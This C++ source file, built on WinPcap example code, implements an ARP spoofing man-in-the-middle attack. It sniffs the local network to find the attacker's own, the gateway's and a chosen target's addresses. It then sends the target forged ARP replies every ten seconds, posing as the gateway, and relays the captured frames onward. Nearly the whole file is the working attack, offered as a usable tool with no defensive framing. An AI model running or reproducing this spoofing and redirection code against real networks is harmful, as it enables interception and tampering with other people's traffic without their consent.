/*
 * Copyright (c) 1999 - 2005 NetGroup, Politecnico di Torino (Italy)
 * Copyright (c) 2005 - 2006 CACE Technologies, Davis (California)
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. Neither the name of the Politecnico di Torino, CACE Technologies
 * nor the names of its contributors may be used to endorse or promote
 * products derived from this software without specific prior written
 * permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 */

#ifdef _MSC_VER
/*
 * we do not want the warnings about the old deprecated and unsecure CRT functions
 * since these examples can be compiled under *nix as well
 */
#define _CRT_SECURE_NO_WARNINGS
#endif

#include"thread.h"
#include "pcap.h"
#include"packetmanager.h"
#include <time.h>

/* prototype of the packet handler */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
void packetRedirector(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
void getAddressHandler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);


pcap_t *adhandle;
u_int8_t myMacAddress[8];
u_int8_t myIpv4Address[6];
u_int8_t gatewayMacAddress[8];
u_int8_t gatewayIpv4Address[6];
u_int8_t targetMacAddress[8];
u_int8_t targetIpv4Address[6];
u_int8_t ipv4NetMask[6];
u_int8_t macBroadCast[8]={0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,};
bool    stop=false;

void spoofing();

int main()
{
    pcap_if_t *alldevs;
    pcap_if_t *d;
    int inum;
    int i=0;
    char errbuf[PCAP_ERRBUF_SIZE];
    char packet_filter[] = "udp";
                           //"tcp or udp";

    /* Retrieve the device list */
    if(pcap_findalldevs(&alldevs, errbuf) == -1)
    {
        fprintf(stderr,"Error in pcap_findalldevs: %s\n", errbuf);
        return 1;
    }

    /* Print the list */
    for(d=alldevs; d; d=d->next)
    {
        printf("%d. %s", ++i, d->name);
        if (d->description)
            printf(" (%s)\n", d->description);
        else
            printf(" (No description available)\n");
    }

    if(i==0)
    {
        printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
        return -1;
    }

    printf("Enter the interface number (1-%d):",i);
    scanf("%d", &inum);

    /* Check if the user specified a valid adapter */
    if(inum < 1 || inum > i)
    {
        printf("\nAdapter number out of range.\n");

        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }


    /* Jump to the selected adapter */
    for(d=alldevs, i=0; i< inum-1 ;d=d->next, i++);


    if(d->addresses==NULL)
    {
        printf("wrong network");
        return -1;
    }
    memcpy(myIpv4Address,d->addresses->next->addr->sa_data+2,4);
    printf("My : %d.%d.%d.%d\n",myIpv4Address[0],myIpv4Address[1],myIpv4Address[2],myIpv4Address[3]);

    memcpy(ipv4NetMask,d->addresses->next->netmask->sa_data+2,4);
    printf("Mask : %d.%d.%d.%d\n",ipv4NetMask[0],ipv4NetMask[1],ipv4NetMask[2],ipv4NetMask[3]);

    printf("insert target IP : ");
    scanf("%hhu.%hhu.%hhu.%hhu",&targetIpv4Address[0],&targetIpv4Address[1],&targetIpv4Address[2],&targetIpv4Address[3]);

    printf("target : %d.%d.%d.%d\n",targetIpv4Address[0],targetIpv4Address[1],targetIpv4Address[2],targetIpv4Address[3]);
    /* Open the adapter */
    if ((adhandle= pcap_open_live(d->name,	// name of the device
                             65536,			// portion of the packet to capture.
                                            // 65536 grants that the whole packet will be captured on all the MACs.
                             1,				// promiscuous mode (nonzero means promiscuous)
                             1000,			// read timeout
                             errbuf			// error buffer
                             )) == NULL)
    {
        fprintf(stderr,"\nUnable to open the adapter. is not supported by WinPcap\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }



    /* Check the link layer. We support only Ethernet for simplicity. */
    if(pcap_datalink(adhandle) != DLT_EN10MB)
    {
        fprintf(stderr,"\nThis program works only on Ethernet networks.\n");
        /* Free the device list */
        pcap_freealldevs(alldevs);
        return -1;
    }


    /* At this point, we don't need any more the device list. Free it */
    //pcap_freealldevs(alldevs);

    /* start the capture */
    pcap_loop(adhandle, 0, getAddressHandler, NULL);


    Thread* arpThread=new Thread;
    arpThread->setRoutine(spoofing);
    arpThread->start();
    pcap_loop(adhandle, 0, packetRedirector, NULL);
    printf("press any key for stop");
    getchar();
    getchar();
    stop=true;

    return 0;
}

void spoofing()
{
    while(1)
    {
        if(stop)
            break;
        ARPManager arpManager(myMacAddress,gatewayIpv4Address,targetMacAddress,targetIpv4Address,ARPHRD_ETHER,ETHERTYPE_IP,ARPOP_REPLY);
        EthernetManager etherManager(myMacAddress,targetMacAddress,ETHERTYPE_ARP,&arpManager);
        u_int8_t buffer[1500];
        etherManager.getRawStream(buffer,1500);
        pcap_sendpacket(adhandle,buffer,etherManager.getRawStreamLength());
        Sleep(10000);
    }
}



/* Callback function invoked by libpcap for every incoming packet */
void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    struct tm *ltime;
    char timestr[16];
    time_t local_tv_sec;
    /*
     * unused parameter
     */
    (void)(param);

    /* convert the timestamp to readable format */
    local_tv_sec = header->ts.tv_sec;
    ltime=localtime(&local_tv_sec);
    strftime( timestr, sizeof timestr, "%H:%M:%S", ltime);

    /* print timestamp and length of the packet */
    printf("%s.%.6d len:%d \n", timestr, header->ts.tv_usec, header->len);

    char* src,* dst, *type;
    u_int8_t* data;
    ProtocolManager* root    =new EthernetManager((u_int8_t*)pkt_data,header->len);
    ProtocolManager* protocolManager=root;
    ProtocolManager* subProtocolManager;

    /*
    fprintf(stderr,"Data : ");
    data=new u_int8_t[protocolManager->getRawStreamLength()];
    {
        protocolManager->getRawStream(data,protocolManager->getRawStreamLength());
        for(int i=0;i<protocolManager->getRawStreamLength();i++)
        {
            if((i+1)%16==0)
                fprintf(stderr,"\n");
            fprintf(stderr,"%02x ",data[i]);
        }
        fprintf(stderr,"\n");
    }
    delete data;
    */

    while(protocolManager)
    {
        char type[256]={0,};
        protocolManager->getProtocolTypeAsString(type,200);
        char src[256]={0,};
        protocolManager->getSourceAddressAsString(src,200);
        char dst[256]={0,};
        protocolManager->getDestinationAddressAsString(dst,200);

        printf("%s",type);
        for(int i=0;i<2-strlen(type)/8;i++)
            printf("\t");
        if(strlen(type))
            printf(": %s to %s \n",src,dst);
        if(strcmp(type,"IP")==0)
        {
            printf("TTL : %d\n",((IPManager*)protocolManager)->getTimeToLive());
        }

        subProtocolManager =protocolManager->getSubProtocolManager();
        protocolManager=subProtocolManager;
    }
    //    if(pcap_sendpacket(adhandle,pkt_data,header->len))
    //    if(pcap_sendpacket(adhandle,data,protocolManager->getRawStreamLength()))
    //        fprintf(stderr,"error\n");
    delete root;
    printf("\n");

}

void packetRedirector(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    /*
     * unused parameter
     */
    (void)(param);

    u_int8_t srcAddr[16];
    u_int8_t dstAddr[16];
    u_int8_t data[5000];
    ProtocolManager* root    =new EthernetManager((u_int8_t*)pkt_data,header->len);
    ProtocolManager* protocolManager=root;
    ProtocolManager* subProtocolManager;

    root->getSourceAddress(srcAddr,10);
    root->getDestinationAddress(dstAddr,10);

    if(memcmp(srcAddr,targetMacAddress,6)==0 && memcmp(dstAddr,myMacAddress,6)==0)
    {
        ((EthernetManager*)root)->setAddresss(myMacAddress,gatewayMacAddress);
        root->getRawStream(data,5000);
        printf("Len : %d\n",root->getRawStreamLength());
        if(pcap_sendpacket(adhandle,data,root->getRawStreamLength()))
            fprintf(stderr,"error\n");
    }


    //    if(pcap_sendpacket(adhandle,pkt_data,header->len))
    //    if(pcap_sendpacket(adhandle,data,protocolManager->getRawStreamLength()))
    //        fprintf(stderr,"error\n");
    delete root;

}

/**/
void getAddressHandler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data)
{
    /*
     * unused parameter
     */
    (void)(param);


    ProtocolManager*    root    =new EthernetManager((u_int8_t*)pkt_data,header->len);
    ProtocolManager*    protocolManager=root;
    ProtocolManager*    subProtocolManager;

    static bool getMyMac=false,getGatewayMac=false,getGatewayIP=false,getTargetMac;

    while(protocolManager)
    {
        u_int8_t            srcAddr[256];
        u_int8_t            dstAddr[256];
        char type[256]={0,};
        protocolManager->getProtocolTypeAsString(type,200);

        if(strcmp("IP",type)==0)
        {
            if( getMyMac==false)
            {
                protocolManager->getSourceAddress(srcAddr,4);
                if(memcmp(srcAddr,myIpv4Address,4)==0)
                {
                    printf("My Mac is Found!\n");
                    root->getSourceAddress(myMacAddress,6);
                    for(int i=0;i<ETHER_ADDR_LEN-1;i++)
                        printf("%02x:",myMacAddress[i]);
                    printf("%02x\n",myMacAddress[ETHER_ADDR_LEN-1]);
                    getMyMac=true;

                    if(!getTargetMac)
                    {
                        ARPManager arpManager(myMacAddress,myIpv4Address,targetMacAddress,targetIpv4Address,ARPHRD_ETHER,ETHERTYPE_IP,ARPOP_REQUEST);
                        EthernetManager etherManager(myMacAddress,macBroadCast,ETHERTYPE_ARP,&arpManager);
                        u_int8_t buffer[1500];
                        etherManager.getRawStream(buffer,1500);
                        pcap_sendpacket(adhandle,buffer,etherManager.getRawStreamLength());
                    }
                }
            }
            if( getGatewayMac==false)
            {
                protocolManager->getSourceAddress(srcAddr,6);
                protocolManager->getDestinationAddress(dstAddr,6);
                //넷마스크가 서로 다를 때
                if(     ((*(u_int32_t*)dstAddr)&(*(u_int32_t*)ipv4NetMask))
                         !=
                         ((*(u_int32_t*)srcAddr)&(*(u_int32_t*)ipv4NetMask))
                    )
                {
                    //출발지가 같은 경우 도착지의 맥 어드레스는 브로드캐스팅일 수 있다.

                    //도착지가 같은 네트워크인 경우 출발지의 맥 어드레스는 게이트이다.
                    if(     ((*(u_int32_t*)myIpv4Address)&(*(u_int32_t*)ipv4NetMask))
                            ==
                            ((*(u_int32_t*)dstAddr)&(*(u_int32_t*)ipv4NetMask))
                            )
                    {
                        printf("Gateway Mac is Found!\n");
                        root->getSourceAddress(gatewayMacAddress,6);
                        for(int i=0;i<ETHER_ADDR_LEN-1;i++)
                            printf("%02x:",gatewayMacAddress[i]);
                        printf("%02x\n",gatewayMacAddress[ETHER_ADDR_LEN-1]);
                        getGatewayMac=true;
                    }
                }
            }
        }
        else if(strcmp("ARP",type)==0)
        {
            if( getGatewayMac && !getGatewayIP)
            {
                protocolManager->getSourceAddress(srcAddr,12);
                if( memcmp(srcAddr,gatewayMacAddress,6)==0
                    &&
                    ((*(u_int32_t*)(srcAddr+6))&(*(u_int32_t*)ipv4NetMask))
                    ==
                    ((*(u_int32_t*)(myIpv4Address))&(*(u_int32_t*)ipv4NetMask))
                    )
                {
                    memcpy(gatewayIpv4Address,srcAddr+6,4);
                    printf("Gateway IP is Found!\n");
                    printf("%d.%d.%d.%d\n",gatewayIpv4Address[0],gatewayIpv4Address[1],gatewayIpv4Address[2],gatewayIpv4Address[3]);
                    getGatewayIP=true;
                }
            }
            if(!getTargetMac)
            {
                protocolManager->getSourceAddress(srcAddr,12);
                if(memcmp(srcAddr+6,targetIpv4Address,4)==0)
                {
                    memcpy(targetMacAddress,srcAddr,6);
                    printf("Target Mac is Found!\n");
                    for(int i=0;i<ETHER_ADDR_LEN-1;i++)
                        printf("%02x:",targetMacAddress[i]);
                    printf("%02x\n",targetMacAddress[ETHER_ADDR_LEN-1]);
                    getTargetMac=true;
                }
            }
        }

        if(getGatewayMac && getGatewayIP && getTargetMac && getMyMac)
        {
            //printf("%d.%d.%d.%d\n",myIpv4Address[0],myIpv4Address[1],myIpv4Address[2],myIpv4Address[3]);
            pcap_breakloop(adhandle);
        }

        subProtocolManager =protocolManager->getSubProtocolManager();
        protocolManager=subProtocolManager;
    }
    delete root;

}
